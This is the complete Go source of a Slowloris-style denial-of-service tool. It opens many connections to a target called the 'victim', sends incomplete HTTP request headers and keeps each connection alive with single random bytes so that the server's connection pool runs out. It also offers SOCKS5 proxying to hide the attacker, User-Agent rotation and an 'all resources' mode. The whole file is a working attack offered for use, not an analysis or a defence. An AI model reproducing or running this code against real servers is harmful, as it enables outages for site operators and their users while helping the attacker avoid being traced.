package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var lock = &sync.Mutex{}
var wg = &sync.WaitGroup{}

type attackParams struct {
	serverURL   *url.URL
	maxConn     *uint64
	currConn    *uint64
	timeout     *uint64
	agents      []string
	duration    *uint64
	auto        *bool
	proxy       *bool
	proxyServer *string
	proxyAuth   *proxy.Auth
}

type connection struct {
	payload *string
	id      int
	conn    net.Conn
}

func main() {
	attack := parseArguments()
	quit := make(chan bool)
	cons := int(*attack.maxConn)
	host := attack.serverURL.Hostname()
	port := attack.serverURL.Port()
	endpoint, tcperr := net.ResolveTCPAddr("tcp", host+":"+port)
	if tcperr != nil {
		log.Fatalf("%v\n", tcperr)
	}

	var dial func() (net.Conn, error)
	if *attack.proxy {
		log.Println("Trying to setup the sock5 proxy")
		proxyDialer, err := proxy.SOCKS5(endpoint.Network(), *attack.proxyServer, attack.proxyAuth, proxy.Direct)
		if err != nil {
			log.Fatalf("%v\n", err)
		}

		log.Println("sock5 is up")

		dial = func() (net.Conn, error) {
			conn, cerr := proxyDialer.Dial(endpoint.Network(), endpoint.String())
			if cerr != nil {
				return nil, cerr
			}

			tcpConn := conn.(*net.TCPConn)
			lerr := tcpConn.SetLinger(0)
			if lerr != nil {
				return nil, lerr
			}

			return conn, nil
		}

	} else {
		dial = func() (net.Conn, error) {
			conn, err := net.Dial(endpoint.Network(), endpoint.String())
			if err != nil {
				return nil, err
			}

			tcpConn := conn.(*net.TCPConn)
			lerr := tcpConn.SetLinger(0)
			if lerr != nil {
				return nil, lerr
			}

			return conn, nil
		}
	}

	currConnections := uint64(0)
	attack.currConn = &currConnections

	i := 1
	for ; i <= cons; i++ {
		agent := attack.agents[rand.Intn(len(attack.agents))]
		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, dial, i)
		if err != nil {
			opErr := err.(*net.OpError)
			switch opErr.Err.(type) {
			case *os.SyscallError:
				// os related errors, e.g.
				// connection refuse from the server, socket opening problems
				log.Println(opErr.Err)
				log.Println("Starting a new monitoring routine")
			case *net.DNSError:
				// if we reached this case, then most
				// probably the host does not exists
				log.Fatalln(opErr.Err)
			default:
				// should not reach here
				log.Fatalln("Unknown error, terminating the program")
			}

			break
		} else {
			lock.Lock()
			*attack.currConn++
			go connection.start(attack.currConn, attack.timeout, quit)
			lock.Unlock()
		}
	}

	go monitor(attack, endpoint, i, dial, quit)

	time.Sleep(time.Second * time.Duration(*attack.duration))
	wg.Add(int(*attack.currConn) + 1)
	close(quit)
	wg.Wait()
	log.Println("<-- Exiting the program")
}

// starts a new routine that continuously sends packets to the server
// to keep the connection
func (m *connection) start(counter, timeout *uint64, quit chan bool) {
	log.Printf("Starting worker for #%d socket\n", m.id)

	defer func() {
		log.Printf("<-- Stop sending random packets to #%d socket\n", m.id)
		m.conn.Close()
		wg.Done()
	}()

	log.Printf("--> Sending initial payload to #%d socket\n", m.id)
	packet := []byte(*m.payload)
	_, err := m.conn.Write(packet)
	if err != nil {
		log.Printf("Failed to send the initial packet to #%d socket: %v", m.id, err)
	}

	for {
		select {
		case <-quit:
			return
		default:
			time.Sleep(time.Second * time.Duration(rand.Int63n(int64(*timeout)+1)))

			// send 1 byte packet every time
			randPackets := make([]byte, 1)
			randPackets[0] = byte(rand.Intn(256))

			_, err = m.conn.Write(randPackets)
			if err != nil {
				log.Printf("Failed sending random packet to #%d socket:\n\t%v\n", m.id, err)

				lock.Lock()
				*counter--
				lock.Unlock()

				return
			}

			log.Printf("--> Sent random packet to #%d socket\n", m.id)
		}
	}
}

// tries to create as much tcp connections as possible
func monitor(attack *attackParams, address *net.TCPAddr, id int, dial func() (net.Conn, error), quit chan bool) {
	defer func() {
		log.Println("<-- Stop running the monitoring routine")
		wg.Done()
	}()
	retry := time.Second * time.Duration(*attack.timeout)

	for {
		select {
		case <-quit:
			return
		default:
			log.Println("Trying to open a new socket from the monitor routine...")

			lock.Lock()
			if *attack.maxConn > *attack.currConn || *attack.auto {
				lock.Unlock()
				connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], dial, id)

				if err != nil {
					time.Sleep(retry)
					continue
				} else {
					log.Printf("Successfully opened #%d socket\n", id)
				}

				lock.Lock()
				*attack.currConn++
				go connection.start(attack.currConn, attack.timeout, quit)
				lock.Unlock()

				id++
			} else {
				lock.Unlock()
				time.Sleep(retry)
			}
		}
	}
}

func createConnection(address *net.TCPAddr, path, agent string, dial func() (net.Conn, error), id int) (*connection, error) {
	payload := func() string {
		var headerPath string
		if path == "" {
			headerPath = "/"
		} else {
			headerPath = path
		}

		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", headerPath, address.IP.String(), agent)
	}()

	conn, err := dial()
	if err != nil {
		return nil, err
	}

	return &connection{&payload, id, conn}, nil
}

func parseArguments() *attackParams {
	server := flag.String("s", "http://localhost:8080", "The address of the victim")
	connectionsNr := flag.Uint64("c", 5, "The number of connections to establish with the victim")
	timeout := flag.Uint64("t", 10, "The time between sending packets in every active connection in seconds")
	agentsPath := flag.String("ap", "agents.txt", "The file name with varius User-Agent headers. Is optional")
	duration := flag.Uint64("d", 10*60, "The duration of the attack in seconds")
	auto := flag.Bool("a", false, "Take all resources available automatically")
	useProxy := flag.Bool("proxy", false, "Use sock5 proxy")
	proxyAddress := flag.String("pa", "", "The address of the proxy server [host:port]")
	proxyUser := flag.String("pu", "", "The username for the proxy auth")
	proxyPassword := flag.String("ppw", "", "The password for the proxy auth")

	flag.Parse()

	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
		s := fmt.Sprintf("http://%s", *server)
		server = &s
		log.Printf("The protocol has not been specified for the target server [%s], will use http", s)
	}

	victimURL, err := url.ParseRequestURI(*server)
	if err != nil {
		log.Fatalln(err)
	}

	if *useProxy && *proxyAddress == "" {
		log.Fatalln("No proxy server specified")
	}

	var credentials *proxy.Auth
	if *proxyUser == "" || *proxyPassword == "" {
		credentials = nil
	} else {
		credentials = &proxy.Auth{
			User:     *proxyUser,
			Password: *proxyPassword,
		}
	}

	var userAgents []string
	agents, err := ioutil.ReadFile(*agentsPath)
	if err != nil {
		defaultUserAgent := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
		log.Printf(`Failed to read the list of user agents
			Falling back to the default one
			Will use: %s`,
			defaultUserAgent)
		userAgents = append(userAgents, defaultUserAgent)
	} else {
		log.Println("Found the agents file")
		userAgents = strings.Split(string(agents), "\n")
	}

	attack := attackParams{
		serverURL:   victimURL,
		maxConn:     connectionsNr,
		timeout:     timeout,
		agents:      userAgents,
		duration:    duration,
		auto:        auto,
		proxy:       useProxy,
		proxyServer: proxyAddress,
		proxyAuth:   credentials,
	}

	return logSetup(&attack)
}

func logSetup(attack *attackParams) *attackParams {
	log.Printf("Attack will be performed on [%s]\n", attack.serverURL.String())
	log.Printf("The timeout between messages is [%d] seconds\n", *attack.timeout)
	log.Printf("The attack will last for [%d] seconds\n", *attack.duration)

	if *attack.auto {
		log.Println("Will try to use all available resources and establish as many connections as possible")
	} else {
		log.Printf("Will try to establish [%d] connections to the server\n", *attack.maxConn)
	}

	return attack
}
